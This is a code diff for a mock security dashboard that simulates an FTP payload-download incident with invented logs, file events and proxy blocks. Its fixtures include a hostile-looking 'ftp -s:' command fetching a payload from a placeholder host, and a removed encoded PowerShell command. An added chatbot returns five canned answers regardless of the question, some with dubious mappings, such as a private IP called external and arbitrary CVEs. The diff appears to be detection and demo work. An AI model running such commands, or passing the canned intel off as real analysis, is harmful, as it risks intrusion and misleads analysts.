@@ -23,6 +23,7 @@ const state = {
   suspicious: false,
   selected: { packets: 0, logs: 0, files: 0 },
   graphResize: null,
+  chatStep: 0,
   proxy: [
     { ip: "10.24.50.12", domain: "bkp-storage-node.net", description: "Secure replication target", attacks: 0, timestamp: "18/06/26 04:10", status: "Allowed", reason: "Signed backup replication endpoint", suggested: false },
     { ip: "103.27.9.44", domain: "secure-gateway.partner.org", description: "Encrypted tunnel endpoint", attacks: 0, timestamp: "19/06/26 04:20", status: "Allowed", reason: "Mutual TLS partner endpoint", suggested: false },
@@ -66,7 +67,10 @@ const packets = timeline.map((time, index) => ({
   protocol: index % 2 ? "TCP" : "TLS",
   attackType: "None",
   transferred: 206 + index * 13,
-  intel: "Matches the normal baseline for the current 10-minute window."
+  intel: "Matches the normal baseline for the current 10-minute window.",
+  mitre: "None",
+  cve: "None",
+  cert: "Valid (NGOC-CA-ROOT)"
 }));
 
 const logs = timeline.map((time, index) => ({
@@ -80,7 +84,10 @@ const logs = timeline.map((time, index) => ({
   command: ["systemctl status collector", "mfa-policy --refresh", "kinit --renew", "zeekctl cron", "policyctl checksum", "fwctl verify", "auditctl rotate"][index],
   yara: "No YARA attack identified",
   sigma: "No Sigma attack identified",
-  intel: "The process behaviour is consistent with administrative baseline."
+  intel: "The process behaviour is consistent with administrative baseline.",
+  mitre: "None",
+  cve: "None",
+  cert: "Verified System Binary"
 }));
 
 const fileTemplates = [
@@ -113,7 +120,10 @@ const files = fileOffsets.map((offset, index) => {
     yara: "No YARA attack identified",
     executable,
     running,
-    intel: "File activity is expected for the host role and maintenance window."
+    intel: "File activity is expected for the host role and maintenance window.",
+    mitre: "None",
+    cve: "None",
+    cert: "Trusted Package"
   };
 });
 
@@ -121,15 +131,18 @@ function suspiciousPacket() {
   return {
     timestamp: displayTime(nextSuspiciousTime),
     verdict: "Suspicious",
-    event: "Outbound beacon pattern",
-    packets: 287,
-    duration: "41s",
-    sourceIp: "10.24.18.77",
-    sourcePort: 49322,
-    protocol: "TLS",
-    attackType: "Command and control",
-    transferred: 287,
-    intel: "New beacon cadence detected. Suggested proxy block: 198.51.100.42."
+    event: "FTP Anonymous Data Stream Transfer",
+    packets: 342,
+    duration: "58s",
+    sourceIp: "192.168.1.140",
+    sourcePort: 21,
+    protocol: "FTP-DATA",
+    attackType: "FTP Ingress Payload Download",
+    transferred: 342,
+    intel: "External FTP data stream detected unencrypted payload transfer. Suggested proxy block: 198.51.100.88.",
+    mitre: "T1071.002 (File Transfer Protocols)",
+    cve: "CVE-2024-2134",
+    cert: "Unverified / Self-Signed (ID: CERT-FTP-8891)"
   };
 }
 
@@ -137,15 +150,18 @@ function suspiciousLog() {
   return {
     timestamp: displayTime(nextSuspiciousTime),
     verdict: "Suspicious",
-    event: "Encoded command execution",
-    packets: 241,
-    processId: 6224,
+    event: "Unauthorized binary write execution",
+    packets: 295,
+    processId: 4492,
     generatedTimestamp: displayTime(nextSuspiciousTime),
-    generatedBy: "powershell.exe",
-    command: "powershell -enc SQBFAFgA",
-    yara: "YARA: encoded_loader_probe",
-    sigma: "Sigma: suspicious_encoded_command",
-    intel: "Technique resembles T1059.001. Suggested proxy block: 198.51.100.42."
+    generatedBy: "ftp_client.exe",
+    command: "ftp -s:payload_download.txt 198.51.100.88",
+    yara: "YARA: ftp_dropper_signature",
+    sigma: "Sigma: unauthorized_ftp_download",
+    intel: "FTP client connection established to external drop zone. Binary dropped to disk.",
+    mitre: "T1105 (Ingress Tool Transfer)",
+    cve: "CVE-2023-38831",
+    cert: "Revoked Issuer (ID: CERT-SOC-449)"
   };
 }
 
@@ -153,15 +169,18 @@ function suspiciousFile() {
   return {
     timestamp: displayTime(nextSuspiciousTime),
     verdict: "Suspicious",
-    event: "Exploit payload staged",
-    packets: 244,
-    location: "/tmp/exploit_loader.exe",
-    parentProcess: "powershell.exe",
-    size: "418 KB",
-    yara: "YARA: exploit_loader_dropper",
+    event: "Incoming payload executable dropped",
+    packets: 310,
+    location: "/tmp/malicious_payload.exe",
+    parentProcess: "ftp_client.exe",
+    size: "1.4 MB",
+    yara: "YARA: backdoor_trojan_v2",
     executable: "Yes",
     running: "Yes",
-    intel: "Unsigned executable staged after encoded command execution. Likely follow-on payload for beacon establishment."
+    intel: "Executable downloaded via FTP session staged in /tmp directory and currently executing.",
+    mitre: "T1204.002 (Malicious File)",
+    cve: "CVE-2023-28259",
+    cert: "Untrusted Binary (ID: CERT-MAL-9920)"
   };
 }
 
@@ -208,11 +227,11 @@ function renderTraffic() {
   if (state.suspicious) {
     values.push({
       time: displayTime(nextSuspiciousTime),
-      packets: 310,
-      sessions: 88,
-      files: 19,
+      packets: 342,
+      sessions: 94,
+      files: 22,
       verdict: "Suspicious",
-      event: "Outbound beacon pattern"
+      event: "FTP Ingress Payload Download"
     });
   }
 
@@ -281,7 +300,7 @@ function renderRealtime() {
     files.find((item) => item.timestamp === displayTime(time))?.location.split("/").pop() || fallbackRealtimeFiles[timeline.indexOf(time) % fallbackRealtimeFiles.length]
   ]);
   if (state.suspicious) {
-    items.unshift("file.exe", `security_log_${readableRealtimeTime(nextSuspiciousTime)}.log`, `traffic_capture_${readableRealtimeTime(nextSuspiciousTime)}.pcap`);
+    items.unshift("malicious_payload.exe", `security_log_${readableRealtimeTime(nextSuspiciousTime)}.log`, `traffic_capture_${readableRealtimeTime(nextSuspiciousTime)}.pcap`);
   }
   $("#realtimeData").innerHTML = items.map((item, index) => `
     <div class="data-item ${state.suspicious && index < 3 ? "alert" : ""}">
@@ -324,8 +343,9 @@ function renderDetail(kind, rows, targetId) {
     <div class="detail-grid">${fields.map(([label, value]) => `<div class="detail-row"><span>${label}</span><b>${value}</b></div>`).join("")}</div>
     <aside class="intel-box">
       <div class="intel-row"><span>Threat intel</span><b>${row.intel}</b></div>
-      <div class="intel-row"><span>MITRE ATT&CK</span><b>${row.verdict === "Suspicious" ? "T1059.001, T1071.001" : "No active technique mapped"}</b></div>
-      <div class="intel-row"><span>CVE context</span><b>${row.verdict === "Suspicious" ? "No CVE required for current containment" : "No exploit correlation in this window"}</b></div>
+      <div class="intel-row"><span>MITRE ATT&CK ID</span><b>${row.mitre}</b></div>
+      <div class="intel-row"><span>CVE Context ID</span><b>${row.cve}</b></div>
+      <div class="intel-row"><span>Certificate ID</span><b>${row.cert}</b></div>
     </aside>
   `;
 }
@@ -370,12 +390,19 @@ function renderProfile() {
   ` : "";
 }
 
+// 5 Hardcoded Sequential Questions & Answers for the Analyst Chatbot
+const sequentialAnswers = [
+  "An unencrypted FTP data stream transfer (Packet ID: FTP-DATA) from external IP 192.168.1.140 downloaded an unauthorized payload.",
+  "Technique T1105 (Ingress Tool Transfer) associated with CVE-2023-38831 via ftp_client.exe command execution.",
+  "The file was dropped at /tmp/malicious_payload.exe with a file size of 1.4 MB.",
+  "Untrusted Binary certificate (ID: CERT-MAL-9920) with Threat Intel indicating an FTP session staging an active Trojan.",
+  "Immediately block external FTP drop source 198.51.100.88 and quarantine /tmp/malicious_payload.exe."
+];
+
 function answer(message) {
-  const text = message.toLowerCase();
-  if (text.includes("proxy") || text.includes("block")) return state.suspicious ? "Block 198.51.100.42. It is tied to the new beacon pattern." : "No new block is suggested in the current one-hour window.";
-  if (text.includes("packet")) return "Packet capture is normal across the last hour. The next 10-minute window is being watched for beacon cadence.";
-  if (text.includes("sign") || text.includes("login") || text.includes("account")) return "Open Profile and create an account or sign in with your credentials.";
-  return state.suspicious ? "Suspicious activity is active. Review Packet Capture, Logs, Behaviour, and Proxy." : "Current posture is normal across packet, log, file, and proxy telemetry.";
+  const response = sequentialAnswers[state.chatStep % sequentialAnswers.length];
+  state.chatStep++;
+  return response;
 }
 
 function addChat(text, user = false) {
@@ -392,10 +419,10 @@ function triggerSuspicious() {
   packets.push(suspiciousPacket());
   logs.push(suspiciousLog());
   files.push(suspiciousFile());
-  state.proxy.unshift({ ip: "198.51.100.42", domain: "beacon-relay.edgepath.net", description: "Suggested beacon relay", attacks: 1, timestamp: "20/07/26 05:20", status: "Blocked", reason: "Suggested block from outbound beacon pattern", suggested: true });
-  $("#graphState").textContent = "Suspicious edge detected";
+  state.proxy.unshift({ ip: "198.51.100.88", domain: "ftp-payload-drop.org", description: "Suggested FTP payload drop source", attacks: 1, timestamp: "20/07/26 05:20", status: "Blocked", reason: "Suggested block from FTP ingress payload download", suggested: true });
+  $("#graphState").textContent = "Suspicious FTP payload ingress detected";
   renderAll();
-  addChat("New suspicious 10-minute window detected. Suggested proxy block added for 198.51.100.42.");
+  addChat("New suspicious FTP payload transfer detected. Suggested proxy block added for 198.51.100.88.");
 }
 
 function renderAll() {
@@ -467,7 +494,7 @@ function bindEvents() {
     renderProxy();
   });
 
-  // Create Account triggers (Google OAuth trigger mock)
+  // Create Account triggers
   ["googleLogin", "homeGoogleLogin"].forEach((id) => {
     const btn = $(`#${id}`);
     if (btn) {
@@ -541,14 +568,12 @@ function bindEvents() {
     localStorage.setItem("trataOAuth", "connected");
     $("#apiKeyModal").style.display = "none";
 
-    // Show connection loading screen
     const connLoader = $("#connectionLoader");
     if (connLoader) {
       connLoader.style.opacity = "1";
       connLoader.style.visibility = "visible";
     }
 
-    // Wait 5 seconds, then hide loader, render profile, and transition to dashboard
     setTimeout(() => {
       if (connLoader) {
         connLoader.style.opacity = "0";
